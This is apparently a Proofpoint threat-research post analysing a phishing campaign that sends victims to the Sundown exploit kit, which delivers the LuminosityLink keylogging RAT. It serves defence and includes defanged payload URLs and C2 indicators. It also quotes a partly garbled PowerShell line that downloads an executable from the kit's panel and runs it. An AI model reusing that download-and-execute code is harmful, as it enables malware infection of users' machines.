Proofpoint researchers observed both attachments and\nURLs being used by the campaign; one of the more widely distributed examples employed a “breaking news” template and a malicious URL.\n(Fig. 1)\n\n_Figure 1: Phishing email containing “breaking news” and malicious links._\n\nThe fake news update delivered by the phishing email is false but combines sensationalism with popular suspicion of banks to effectively\n[entice recipients to click. However, in a departure from the targeting techniques we have described elsewhere, rather than connect to a TDS](https://www.proofpoint.com/us/threat-insight/post/how-steal-access-over-500000-bank-accounts)\nthat checks for specific client attributes before pulling in the exploit kit, in this case the link connects the client directly to the Sundown EK.\nSundown does not attempt to distinguish between countries, IP addresses, companies, or other client attributes, and instead attempts to\nexecute exploits on clients indiscriminately. Moreover, the “unsubscribe” and “report as spam” links in the phishing message also link to the\nSundown EK. While it is not unusual to have multiple malicious URLs in a single message, the fact that these link directly to the EK, rather\nthan to a TDS or spam site, only increases the risk posed by this message.\n\n[The exploits being served by Sundown in this campaign include the Adobe Flash zero-days that were detected on the Angler EK in early 2015](http://www.trendmicro.com/us/marketing/newsletter/flod/20150215/security-spotlight.html)\nand reflect a preference for Flash player exploits and broadly applicable Windows vulnerabilities.

Sood & Rohit Bansal [2])](https://www.virusbtn.com/virusbulletin/archive/2015/06/vb201506-Beta-BEP)_\n\nThe exploits observed in the Sundown EK changed significantly in a relatively short period, adding another Flash vulnerability (patched in April)\nand an Internet Explorer vulnerability from 2012. These changes demonstrate that the actors behind the Sundown EK continue to adjust and\nrefine their exploit combinations in order to achieve the best results.\n\nThe exploits are delivered in PHP and SWF files that include the code to exploit the targeted vulnerabilities. Many of the PHP files are encoded\nwith VBScript encoder (VBS to VBE). The structure of exploit-serving URLs is shown below; long URL and file names are used and may differ\nin other samples:\n\n[hxxp://<sundown_panel>/ERFREERGYHIRYTUIYTUEIRHJTRJIHURJHRTRTIEUUEYREUI/lat45786547685457864375643875jhgfhf45.php\n\n[hxxp://<sundown_panel>/ERFREERGYHIRYTUIYTUEIRHJTRJIHURJHRTRTIEUUEYREUI/1464875454kj5hgkj45h4j35f4j3f5hj35fg4g5f.sw\n\n[hxxp://<sundown_panel>/ERFREERGYHIRYTUIYTUEIRHJTRJIHURJHRTRTIEUUEYREUI/311875648754y5tg4jkh5fg45hjf43hgj5f43hg.sw\n\n[hxxp://<sundown_panel>/ERFREERGYHIRYTUIYTUEIRHJTRJIHURJHRTRTIEUUEYREUI/17896968796549876986jhgkjhkg65hj5gf6hjk56\n\n[hxxp://<sundown_panel>/ERFREERGYHIRYTUIYTUEIRHJTRJIHURJHRTRTIEUUEYREUI/145328452345324683274632yjetguyjkgfjfr54hf\n\nOne of the PHP files is a VBScript file that utilizes PowerShell to download and execute the payload using code such as:\n\n\n-----\n\n( e Object Syste et ebC e t) o oad e( [ p // su do _pa e /S S/do a p p d Se ce 3 e e], $e\n'\\EDWEDRFEDDF-3.exe');\n$val = $env:APPDATA + '\\EDWEDRFEDDF-3.exe';\nStart-Process $val;\n\nThe reliance on Powershell limits Sundown’s ability to execute on Windows XP systems – a rare break for a platform that continues to be\n[widely used despite no longer being supported by Microsoft.](http://www.microsoft.com/windows/en-us/xp/end-of-xp-support.aspx)\n\nPrevious analyses have observed the Sundown EK delivering the Neutrino DDoS bot. In this campaign, Proofpoint researchers detected a new\npayload: the Luminosity Link remote access Trojan (RAT). The stated purpose of LuminosityLink is ostensibly benign: \"LuminosityLink allows\nsystem administrators to manage a large amount of computers concurrently. Our product is ideal for business owners, educational institutions,\nand Windows system administrators.” (Fig. 3)\n\n_Figure 3: LuminosityLink features described on product web site ([hxxps://luminosity[.]link/])_\n\nAnalysis upon install, however, reveals a very aggressive key logger that injects its code in almost every running process on the computer, and\nmultiple attempts are made if not initially successful. This \"injection\" behavior is aggressive even by the standard of the Zeus family: very few\nmalware families exhibit such an aggressive behavior, and it is particularly unusual to observe this in key loggers, even commercial ones. We\nhave observed LuminosityLink being used to download additional payloads. It is possible that the actors involved here are using\nLuminosityLink as a platform to collect information from the victim, and using that information to decide whether to deploy more sophisticated\n[malware at high-value targets. While it is not unusual for adware and](https://blog.kaspersky.com/lenovo-pc-with-adware-superfish-preinstalled/) [other questionable software to pass themselves off as legitimate tools, it](http://arstechnica.com/security/2015/06/ding-dong-the-witch-is-dead-microsoft-av-gets-tough-on-ask-toolbar/)\nis striking to see a piece of software with a set of obviously malicious functions to be marketed so actively and openly.\n\n[This unusual ploy becomes somewhat more intelligible in the context of the recent conviction and sentencing of the Blackshades RAT author](https://nakedsecurity.sophos.com/2015/06/25/blackshades-rat-co-author-sentenced-to-57-months-in-prison/)\nand associates: by actively marketing their \"solution\" as a tool with legitimate business and administrative uses, the LuminosityLink creators\ncould be attempting to forestall legal action, although this argument is certainly not helped by distributing the RAT via an exploit kit.\n\n[The recent rise of Sundown shows that the EK market continues to evolve in the void left by the collapse of the Blackhole EK, as malware](http://krebsonsecurity.com/2013/12/meet-paunch-the-accused-author-of-the-blackhole-exploit-kit/)\ncreators experiment with different approaches to delivering exploits and challenge the dominance of sophisticated, high-value EKs such as\n[Angler. This may also be a sign that the malicious macro campaigns that have dominated the threat landscape since late 2015 are beginning](https://threatpost.com/analyzing-angler-the-worlds-most-sophisticated-exploit-kit/110904)\nto be play out and attackers are starting to look for other delivery and masking techniques: time and additional observation with tell.\n\n_Indicators of Compromise_\n\nLuminosityLink C2 server URL:\n\n[hxxp://emenike[.]no-ip-biz]\n\n[hxxp://serv[.]textme.pw]\n\n_References_\n\n[1. http://malware.dontneedcoffee.com/2015/06/fast-look-at-sundown-ek.html](http://malware.dontneedcoffee.com/2015/06/fast-look-at-sundown-ek.html)\n[2. https://www.virusbtn.com/virusbulletin/archive/2015/06/vb201506-Beta-BE](https://www.virusbtn.com/virusbulletin/archive/2015/06/vb201506-Beta-BEP)\n\nSubscribe to the Proofpoint Blog\n\n\n-----",
